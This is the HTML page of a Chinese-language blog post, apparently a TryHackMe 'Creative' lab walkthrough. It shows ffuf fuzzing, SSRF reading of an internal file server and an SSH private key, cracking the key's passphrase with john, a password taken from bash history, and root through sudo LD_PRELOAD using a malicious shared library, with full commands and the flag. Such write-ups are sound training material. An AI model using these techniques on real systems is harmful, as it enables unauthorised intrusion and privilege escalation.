@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_easy_Creative | S1ient</title><meta name="author" content="S1ient"><meta name="copyright" content="S1ient"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="CreativeExploit a vulnerable web application and some misconfigurations to gain root privileges. 端口扫描，有 80 和 22 端口 123序号 || Host地址 || 端口 || 协议 || Uri地址 || 标题 || Banner || 状态码 1 || 10.146.186.245 || 80">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_easy_Creative">
+<meta property="og:url" content="https://s1ient.github.io/post/6c602f0e.html">
+<meta property="og:site_name" content="S1ient">
+<meta property="og:description" content="CreativeExploit a vulnerable web application and some misconfigurations to gain root privileges. 端口扫描，有 80 和 22 端口 123序号 || Host地址 || 端口 || 协议 || Uri地址 || 标题 || Banner || 状态码 1 || 10.146.186.245 || 80">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-12T06:26:10.000Z">
+<meta property="article:modified_time" content="2026-05-12T11:31:53.565Z">
+<meta property="article:author" content="S1ient">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://s1ient.github.io/post/6c602f0e.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_easy_Creative',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-12 19:31:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="S1ient" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="S1ient"><span class="site-name">S1ient</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_easy_Creative</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-12T06:26:10.000Z" title="发表于 2026-05-12 14:26:10">2026-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-12T11:31:53.565Z" title="更新于 2026-05-12 19:31:53">2026-05-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"></div></div></div><article class="post-content" id="article-container"><h1 id="Creative"><a href="#Creative" class="headerlink" title="Creative"></a>Creative</h1><p>Exploit a vulnerable web application and some misconfigurations to gain root privileges.</p>
+<p>端口扫描，有 80 和 22 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序号 || Host地址 || 端口 || 协议 || Uri地址 || 标题 || Banner || 状态码 </span><br><span class="line">1 || 10.146.186.245 || 80 || HTTP || http://10.146.186.245:80 || 301 Moved Permanently || nginx/1.18.0 (Ubuntu),Nginx 1.18.0 || 301</span><br><span class="line">2 || 10.146.186.245 || 22 || SSH || 10.146.186.245:22 ||  || OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 || 0</span><br></pre></td></tr></table></figure>
+
+<p>访问 80 端口会重定向到 <code>creative.thm</code>，修改 <code>/etc/hosts</code> 文件即可正常访问</p>
+<p>这种重定向的一般都是有子域名的，用 <code>ffuf</code> 扫描</p>
+<p>得到子域名 <code>beta</code>，同样添加到 <code>/etc/hosts</code> 里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># ffuf -w /usr/share/wordlists/Simple_Subdomains.txt -u http://creative.thm/ -H &quot;Host:FUZZ.creative.thm&quot; -fw 6 </span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://creative.thm/</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/wordlists/Simple_Subdomains.txt</span><br><span class="line"> :: Header           : Host: FUZZ.creative.thm</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response words: 6</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 327ms]</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>beta.creative.thm</code>，是一个输入框，可以提交 url 进行测试，首先就想到了 ssrf</p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_index.png" alt="beta_index"></p>
+<p>首先输入 <code>file://etc/passwd</code>，结果返回 <code>Dead</code></p>
+<p>输入 <code>https://baidu.com</code> 也返回此页面</p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_test2.png" alt="beta_test2"></p>
+<p>再尝试提交 <code>http://creative.thm/</code>，成功返回了主页面</p>
+<p>同样经过测试，当提交本地地址 <code>http://127.0.0.1/</code> 也会返回该页面</p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_test1.png" alt="beta_test1"></p>
+<p>也就是说当输入该 web 服务器可以连接的页面是会返回响应的内容，不能则返回 Dead，并且看起来不能访问外部的网站</p>
+<p>因此，我们可以利用此功能来获取内部 web 服务器</p>
+<p>使用 ffuf 扫描，得到端口 1337</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># ffuf -u &#x27;http://beta.creative.thm/&#x27; -d &quot;url=http://127.0.0.1:FUZZ/&quot; -w &lt;(seq 1 65535) -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -mc all -t 100 -fs 13</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : POST</span><br><span class="line"> :: URL              : http://beta.creative.thm/</span><br><span class="line"> :: Wordlist         : FUZZ: /proc/self/fd/11</span><br><span class="line"> :: Header           : Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> :: Data             : url=http://127.0.0.1:FUZZ/</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 100</span><br><span class="line"> :: Matcher          : Response status: all</span><br><span class="line"> :: Filter           : Response size: 13</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 447ms]</span><br><span class="line">1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 679ms]</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>http://127.0.0.1:1337</code> 返回了页面，显示了根目录下的文件</p>
+<p>因此可以借助该功能读取 web 服务器里面的文件内容</p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_1337.png" alt="beta_1337"></p>
+<p>输入 <code>http//127.0.0.1:1337/home</code> 找到用户 <code>saad</code>，输入 <code>http://127.0.0.1:1337/home/saad</code> 进入用户目录</p>
+<p>首先有一个 <code>user.txt</code>，可以获取第一个 flag</p>
+<p>有 <code>.bash_history</code> 记录了用户输入的命令，但是目前用不到</p>
+<p>还有一个 <code>.ssh</code>，存放了 ssh 相关的东西，由于开启了 22 端口，所以是一个可以利用的点</p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_saad.png" alt="beta_saad"></p>
+<p>输入 <code>http://127.0.0.1:1337/home/saad/.ssh</code> 查看文件内容</p>
+<p>在 .ssh 目录下发现了私钥 <code>id_rsa</code></p>
+<p><img src="/../image/TryHackMe/easy/Creative/beta_id_rsa.png" alt="beta_id_rsa"></p>
+<p>保存该私钥到 kali 里面，给予 600 权限</p>
+<p>利用 <code>ssh2john</code> 将私钥转化成 <code>John</code> 能识别的哈希格式</p>
+<p>再利用 <code>john</code> 破解该私钥，得到密码 <code>sweetness</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># chmod 600 id_rsa</span><br><span class="line"># ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line"># john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 16 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sweetness        (id_rsa)     </span><br><span class="line">1g 0:00:00:45 DONE (2026-05-12 15:02) 0.02219g/s 21.30p/s 21.30c/s 21.30C/s xbox360..sandy</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用密码短语和密钥，就可以通过 ssh 登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ssh -i id_rsa saad@creative.thm</span><br><span class="line">Enter passphrase for key &#x27;id_rsa&#x27;: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-119-generic x86_64)</span><br><span class="line">.</span><br><span class="line">Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102</span><br><span class="line">saad@ip-10-146-186-245:~$ id</span><br><span class="line">uid=1000(saad) gid=1000(saad) groups=1000(saad)</span><br><span class="line">                    </span><br></pre></td></tr></table></figure>
+
+
+
+<p>读取<code>.bash_history</code>，发现了该用户的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saad@ip-10-146-186-245:~$ cat .bash_history </span><br><span class="line">...</span><br><span class="line">echo &quot;saad:MyStrongestPasswordYet$4291&quot; &gt; creds.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>有了密码就可以查看权限 <code>sudo</code></p>
+<p>发现可以以 root 运行 <code>/usr/bin/ping</code> ，并且配置里面保留了 <code>LD_PRELOAD</code> 环境变量，这样我们就可以通过设置环境变量来运行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saad@ip-10-146-186-245:~$ sudo -l</span><br><span class="line">[sudo] password for saad: </span><br><span class="line">Matching Defaults entries for saad on ip-10-146-186-245:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User saad may run the following commands on ip-10-146-186-245:</span><br><span class="line">    (root) /usr/bin/ping</span><br></pre></td></tr></table></figure>
+
+<p>该变量用于指定进程在加载任何其他库之前要加载的库。</p>
+<p>我们可以利用这一点，<code>ping</code> 以<code>root</code>运行，预加载我们写的恶意 <code>so</code> 库，就能直接提权</p>
+<p>用 <code>nano</code> 编写一个恶意共享库 <code>a.c</code>，<code>ctrl + o</code> 再回车，然后 <code>ctrl +x</code> 退出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saad@ip-10-146-186-245:~$ nano a.c</span><br><span class="line">saad@ip-10-146-186-245:~$ cat a.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">        unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>gcc</code> 编译成动态链接库 <code>a.so</code>，再利用<code>LD_PRELOAD</code>提权</p>
+<p>成功得到 root 权限，并获取第二个 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">saad@ip-10-146-186-245:~$ gcc -fPIC -shared -o a.so a.c -nostartfiles</span><br><span class="line">saad@ip-10-146-186-245:~$ sudo LD_PRELOAD=./a.so /usr/bin/ping</span><br><span class="line">[sudo] password for saad: </span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"># find / -name root.txt 2&gt;/dev/null</span><br><span class="line">/root/root.txt</span><br><span class="line"># cat /root/root.txt</span><br><span class="line">992bfd94b90da48634aed182aae7b99f</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://s1ient.github.io">S1ient</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://s1ient.github.io/post/6c602f0e.html">https://s1ient.github.io/post/6c602f0e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://s1ient.github.io" target="_blank">S1ient</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/3401368e.html" title="TryHackMe_easy_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_easy_Buleprint</div></div></a></div><div class="next-post pull-right"><a href="/post/85d3263d.html" title="TryHackMe_easy_IDE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_easy_IDE</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/3401368e.html" title="TryHackMe_easy_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_easy_Buleprint</div></div></a></div><div><a href="/post/cbbda74.html" title="TryHackMe_easy_Tony the Tiger"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-13</div><div class="title">TryHackMe_easy_Tony the Tiger</div></div></a></div><div><a href="/post/6sfd5316.html" title="TryHackMe_easy_Library"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-11</div><div class="title">TryHackMe_easy_Library</div></div></a></div><div><a href="/post/381630bb.html" title="TryHackMe_easy_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_easy_VulnNet:Internal</div></div></a></div><div><a href="/post/85d3263d.html" title="TryHackMe_easy_IDE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-11</div><div class="title">TryHackMe_easy_IDE</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023/03/25 - 2026 By S1ient</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
